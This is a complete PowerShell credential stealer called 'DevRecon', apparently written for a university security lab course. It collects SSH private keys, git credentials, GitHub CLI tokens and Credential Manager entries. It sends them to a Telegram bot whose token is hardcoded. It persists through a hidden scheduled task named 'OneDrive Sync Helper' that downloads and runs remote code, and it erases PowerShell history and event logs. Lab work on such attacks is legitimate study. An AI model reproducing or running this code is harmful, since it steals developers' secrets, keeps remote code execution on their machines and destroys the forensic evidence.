# ============================================================
#  "DevRecon" – Multi-Stage Developer Credential Harvester
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 – AAU Klagenfurt
#
#  Ablauf:
#    1. Recon   – SSH-Keys, Git-Credentials, GitHub-CLI Token
#    2. Exfil   – Telegram Bot (HTTPS, überall erreichbar)
#    3. Persist  – Scheduled Task lädt dieses Script von Gist
#    4. OPSEC   – PS-History, Temp, Recent Files löschen
#
#  Persist: Scheduled Task lädt dieses Script von GitHub
# ============================================================

$BOT_TOKEN            = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID              = "1780237079"
$PERSIST_GIST_RAW_URL = "https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1"

# ── Hilfsfunktionen ─────────────────────────────────────────

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        $enc      = [System.Text.Encoding]::UTF8
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $CRLF     = "`r`n"
        $header   = $enc.GetBytes(
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"chat_id`"$CRLF$CRLF$CHAT_ID$CRLF" +
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"caption`"$CRLF$CRLF$Caption$CRLF" +
            "--$boundary$CRLF" +
            "Content-Disposition: form-data; name=`"document`"; filename=`"$Filename`"$CRLF" +
            "Content-Type: text/plain; charset=utf-8$CRLF$CRLF"
        )
        $body = $header + $enc.GetBytes($Content) + $enc.GetBytes("$CRLF--$boundary--$CRLF")
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" `
            -Method POST `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $body | Out-Null
    } catch { }
}

# ── PHASE 1: RECON ──────────────────────────────────────────

Send-TgMessage "🕵️ [DEVRECON] $env:COMPUTERNAME\$env:USERNAME gestartet"

$report = [System.Text.StringBuilder]::new()
$null = $report.AppendLine("=== DevRecon | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
$null = $report.AppendLine("Host: $env:COMPUTERNAME | User: $env:USERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption)")
$null = $report.AppendLine("")

# SSH Keys
$null = $report.AppendLine("── SSH KEYS ──────────────────────────────────────────────")
$sshDir = Join-Path $env:USERPROFILE ".ssh"
if (Test-Path $sshDir) {
    Get-ChildItem $sshDir -File | ForEach-Object {
        $null = $report.AppendLine("[ $($_.Name) ]")
        $null = $report.AppendLine((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue))
        $null = $report.AppendLine("")
    }
} else { $null = $report.AppendLine("(kein .ssh Verzeichnis)") }

# .git-credentials – GitHub-Tokens im Klartext
$null = $report.AppendLine("── GIT CREDENTIALS ───────────────────────────────────────")
$gitCreds = Join-Path $env:USERPROFILE ".git-credentials"
if (Test-Path $gitCreds) {
    $null = $report.AppendLine((Get-Content $gitCreds -Raw))
} else { $null = $report.AppendLine("(keine .git-credentials)") }

# .gitconfig
$null = $report.AppendLine("── .GITCONFIG ────────────────────────────────────────────")
$gitConfig = Join-Path $env:USERPROFILE ".gitconfig"
if (Test-Path $gitConfig) {
    $null = $report.AppendLine((Get-Content $gitConfig -Raw))
} else { $null = $report.AppendLine("(keine .gitconfig)") }

# GitHub CLI Token
$null = $report.AppendLine("── GITHUB CLI TOKEN ──────────────────────────────────────")
$ghHosts = Join-Path $env:APPDATA "GitHub CLI\hosts.yml"
if (-not (Test-Path $ghHosts)) { $ghHosts = Join-Path $env:LOCALAPPDATA "GitHub\hosts.yml" }
if (Test-Path $ghHosts) {
    $null = $report.AppendLine((Get-Content $ghHosts -Raw))
} else { $null = $report.AppendLine("(kein GitHub CLI Token)") }

# Windows Credential Manager
$null = $report.AppendLine("── CREDENTIAL MANAGER (git) ──────────────────────────────")
$null = $report.AppendLine((cmdkey /list 2>&1 | Where-Object { $_ -match "git|github" } | Out-String))

# ── PHASE 2: EXFIL via Telegram ─────────────────────────────

Send-TgFile -Filename "devrecon_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
            -Content $report.ToString() `
            -Caption "🔐 DevRecon – $env:COMPUTERNAME\$env:USERNAME"

# ── PHASE 3: PERSISTENZ – Scheduled Task via Gist ───────────

$taskName = "OneDrive Sync Helper"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $cmd = "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command " +
           "`"IEX (New-Object Net.WebClient).DownloadString('$PERSIST_GIST_RAW_URL')`""
    $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $cmd
    $trigger   = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "09:15"
    $settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Settings $settings -Principal $principal -ErrorAction SilentlyContinue | Out-Null
    Send-TgMessage "⏰ [DEVRECON] Scheduled Task '$taskName' angelegt auf $env:COMPUTERNAME"
}

# ── PHASE 4: OPSEC ──────────────────────────────────────────

$histFile = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
if ($histFile -and (Test-Path $histFile)) {
    Remove-Item $histFile -Force -ErrorAction SilentlyContinue
}
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Clear-History
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*.xml" -Force -ErrorAction SilentlyContinue
[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Windows PowerShell") 2>$null
